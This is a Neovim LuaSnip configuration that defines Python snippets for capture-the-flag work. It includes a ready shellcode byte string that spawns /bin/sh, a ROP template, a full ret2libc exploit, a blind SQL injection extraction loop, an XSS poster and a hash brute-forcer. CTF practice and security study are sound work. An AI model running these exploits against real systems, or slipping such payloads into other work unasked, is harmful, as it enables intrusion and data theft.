local ls = require 'luasnip'
local s = ls.snippet
local i = ls.insert_node
local t = ls.text_node
local c = ls.choice_node
local sn = ls.snippet_node
local isn = ls.indent_snippet_node
local fmt = require('luasnip.extras.fmt').fmt
local types = require 'luasnip.util.types'

local function node_with_virtual_text(pos, node, text)
  local nodes
  if node.type == types.textNode then
    node.pos = 2
    nodes = { i(1), node }
  else
    node.pos = 1
    nodes = { node }
  end
  return sn(pos, nodes, {
    node_ext_opts = {
      active = {
        -- override highlight here ("GruvboxOrange").
        virt_text = { { text, 'GruvboxOrange' } },
      },
    },
  })
end

local function nodes_with_virtual_text(nodes, opts)
  if opts == nil then
    opts = {}
  end
  local new_nodes = {}
  for pos, node in ipairs(nodes) do
    if opts.texts[pos] ~= nil then
      node = node_with_virtual_text(pos, node, opts.texts[pos])
    end
    table.insert(new_nodes, node)
  end
  return new_nodes
end

local function choice_text_node(pos, choices, opts)
  choices = nodes_with_virtual_text(choices, opts)
  return c(pos, choices, opts)
end

local ct = choice_text_node

ls.add_snippets('python', {
  -- ╭─────────────────────────────────────────────────────────╮
  -- │                      基础模板                           │
  -- ╰─────────────────────────────────────────────────────────╯
  s(
    'main',
    fmt(
      'def main():\n    {}\n\nif __name__ == "__main__":\n    main()',
      { i(1, 'pass') }
    )
  ),
  
  s(
    'shebang',
    t { '#!/usr/bin/env python3', '# -*- coding: utf-8 -*-', '' }
  ),

  -- ╭─────────────────────────────────────────────────────────╮
  -- │                    CTF 常用导入                         │
  -- ╰─────────────────────────────────────────────────────────╯
  s(
    'pwn',
    t {
      'from pwn import *',
      'context.log_level = "debug"',
      'context.arch = "amd64"',
      ''
    }
  ),

  s(
    'crypto',
    t {
      'from Crypto.Cipher import AES, DES, RSA',
      'from Crypto.Util.number import *',
      'from Crypto.PublicKey import RSA',
      'import hashlib',
      ''
    }
  ),

  s(
    'web',
    t {
      'import requests',
      'import urllib.parse',
      'import base64',
      'import json',
      ''
    }
  ),

  -- ╭─────────────────────────────────────────────────────────╮
  -- │                      PWN 模板                           │
  -- ╰─────────────────────────────────────────────────────────╯
  s(
    'pwn_template',
    fmt(
      'from pwn import *\n\ncontext.log_level = "debug"\ncontext.arch = "amd64"\n\n# 连接设置\nif args.REMOTE:\n    p = remote("{}", {})\nelse:\n    p = process("{}")\n\n# ELF 和 libc\nelf = ELF("{}")\n{}\n\n# 利用代码\n{}\n\np.interactive()',
      {
        i(1, 'host'),
        i(2, 'port'),
        i(3, './binary'),
        i(4, './binary'),
        i(5, '# libc = ELF("./libc.so.6")'),
        i(0, 'pass')
      }
    )
  ),

  s(
    'shellcode',
    c(1, {
      t { 'shellcode = asm(shellcraft.sh())' },
      fmt('shellcode = asm(shellcraft.{}())', { i(1, 'sh') }),
      fmt('shellcode = b"{}"', { i(1, '\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05') })
    })
  ),

  s(
    'rop',
    fmt(
      '# ROP 链构造\npayload = b"A" * {}\npayload += p64({})  # {}\n{}',
      {
        i(1, 'offset'),
        i(2, 'address'),
        i(3, 'gadget/function'),
        i(0, '')
      }
    )
  ),

  s(
    'ret2libc',
    fmt(
      '# ret2libc 攻击\nputs_plt = elf.plt[\'puts\']\nputs_got = elf.got[\'puts\']\nmain_addr = elf.symbols[\'main\']\npop_rdi = {} # ROPgadget --binary ./binary --only "pop|ret"\n\n# 泄露 libc 地址\npayload1 = b"A" * {}\npayload1 += p64(pop_rdi)\npayload1 += p64(puts_got)\npayload1 += p64(puts_plt)\npayload1 += p64(main_addr)\n\np.sendline(payload1)\nputs_addr = u64(p.recvline().strip().ljust(8, b\'\\x00\'))\nlibc_base = puts_addr - libc.symbols[\'puts\']\nsystem_addr = libc_base + libc.symbols[\'system\']\nbin_sh_addr = libc_base + next(libc.search(b\'/bin/sh\'))\n\n# 执行 system("/bin/sh")\npayload2 = b"A" * {}\npayload2 += p64(pop_rdi)\npayload2 += p64(bin_sh_addr)\npayload2 += p64(system_addr)\n\np.sendline(payload2)',
      {
        i(1, '0x401234'),
        i(2, 'offset'),
        i(3, 'offset')
      }
    )
  ),

  -- ╭─────────────────────────────────────────────────────────╮
  -- │                    CRYPTO 模板                          │
  -- ╰─────────────────────────────────────────────────────────╯
  s(
    'rsa_basic',
    fmt(
      'from Crypto.Util.number import *\n\n# RSA 基础参数\nn = {}\ne = {}\nc = {}\n\n# 分解 n 或已知 p, q\np = {}\nq = {}\n\n# 计算私钥\nphi = (p - 1) * (q - 1)\nd = inverse(e, phi)\n\n# 解密\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag)',
      {
        i(1, 'n_value'),
        i(2, '65537'),
        i(3, 'c_value'),
        i(4, 'p_value'),
        i(5, 'q_value')
      }
    )
  ),

  s(
    'aes_decrypt',
    fmt(
      'from Crypto.Cipher import AES\nimport base64\n\nkey = b"{}"\niv = b"{}"\nciphertext = base64.b64decode("{}")\n\ncipher = AES.new(key, AES.MODE_CBC, iv)\nplaintext = cipher.decrypt(ciphertext)\n\n# 去除 padding\nflag = plaintext.rstrip(b\'\\x00\').rstrip(bytes([plaintext[-1]]))\nprint(flag)',
      {
        i(1, 'key'),
        i(2, 'iv'),
        i(3, 'base64_ciphertext')
      }
    )
  ),

  s(
    'hash_crack',
    fmt(
      'import hashlib\nimport itertools\nimport string\n\ntarget_hash = "{}"\ncharset = string.{}\nmax_length = {}\n\nfor length in range(1, max_length + 1):\n    for candidate in itertools.product(charset, repeat=length):\n        password = \'\'.join(candidate)\n        if hashlib.{}(password.encode()).hexdigest() == target_hash:\n            print("Found:", password)\n            break',
      {
        i(1, 'hash_value'),
        i(2, 'ascii_letters + digits'),
        i(3, '6'),
        i(4, 'md5')
      }
    )
  ),

  -- ╭─────────────────────────────────────────────────────────╮
  -- │                     WEB 模板                            │
  -- ╰─────────────────────────────────────────────────────────╯
  s(
    'sql_inject',
    fmt(
      'import requests\nimport string\n\nurl = "{}"\nflag = ""\ncharset = string.ascii_letters + string.digits + "{}"\n\nfor i in range(1, {}):\n    for char in charset:\n        # 盲注 payload\n        payload = "\' OR (SELECT ASCII(SUBSTR(flag,{},1)) FROM flags)={} --"\n        data = {{"input": payload.format(i, ord(char))}}\n        \n        response = requests.post(url, data=data)\n        if "{}" in response.text:\n            flag += char\n            print("Flag so far:", flag)\n            break\n    else:\n        break\n\nprint("Final flag:", flag)',
      {
        i(1, 'http://target.com/login'),
        i(2, '_{}'),
        i(3, '50'),
        i(4, 'i'),
        i(5, 'ord(char)'),
        i(6, 'success_indicator')
      }
    )
  ),

  s(
    'xss_payload',
    fmt(
      'import requests\nimport urllib.parse\n\nurl = "{}"\npayload = "<script>alert(\'XSS\')</script>"\nencoded_payload = urllib.parse.quote(payload)\n\ndata = {{\n    "{}": encoded_payload\n}}\n\nresponse = requests.post(url, data=data)\nprint(response.text)',
      {
        i(1, 'http://target.com/submit'),
        i(2, 'input_field')
      }
    )
  ),

  -- ╭─────────────────────────────────────────────────────────╮
  -- │                    常用工具函数                         │
  -- ╰─────────────────────────────────────────────────────────╯
  s(
    'b64decode',
    fmt('base64.b64decode("{}")', { i(1, 'encoded_string') })
  ),

  s(
    'b64encode',
    fmt('base64.b64encode(b"{}").decode()', { i(1, 'string') })
  ),

  s(
    'hex2bytes',
    fmt('bytes.fromhex("{}")', { i(1, 'hex_string') })
  ),

  s(
    'bytes2hex',
    fmt('{}.hex()', { i(1, 'bytes_var') })
  ),

  s(
    'p64',
    fmt('p64({})', { i(1, 'value') })
  ),

  s(
    'u64',
    fmt('u64({})', { i(1, 'bytes_value') })
  ),

  s(
    'p32',
    fmt('p32({})', { i(1, 'value') })
  ),

  s(
    'u32',
    fmt('u32({})', { i(1, 'bytes_value') })
  ),

  -- ╭─────────────────────────────────────────────────────────╮
  -- │                    调试和输出                           │
  -- ╰─────────────────────────────────────────────────────────╯
  s(
    'debug',
    fmt(
      'print("[DEBUG] {}: " + str({}))',
      {
        i(1, 'variable_name'),
        i(2, 'variable')
      }
    )
  ),

  s(
    'hexdump',
    fmt('print(hexdump({}))', { i(1, 'data') })
  ),

  s(
    'pause',
    t { 'input("Press Enter to continue...")' }
  ),

  -- ╭─────────────────────────────────────────────────────────╮
  -- │                    网络连接                             │
  -- ╰─────────────────────────────────────────────────────────╯
  s(
    'remote',
    fmt('p = remote("{}", {})', { i(1, 'host'), i(2, 'port') })
  ),

  s(
    'process',
    fmt('p = process("{}")', { i(1, './binary') })
  ),

  s(
    'recv',
    c(1, {
      t { 'p.recv()' },
      t { 'p.recvline()' },
      fmt('p.recvuntil(b"{}")', { i(1, 'delimiter') }),
      fmt('p.recv({})', { i(1, 'nbytes') })
    })
  ),

  s(
    'send',
    c(1, {
      fmt('p.send(b"{}")', { i(1, 'data') }),
      fmt('p.sendline(b"{}")', { i(1, 'data') }),
      fmt('p.sendafter(b"{}", b"{}")', { i(1, 'delimiter'), i(2, 'data') })
    })
  ),
})
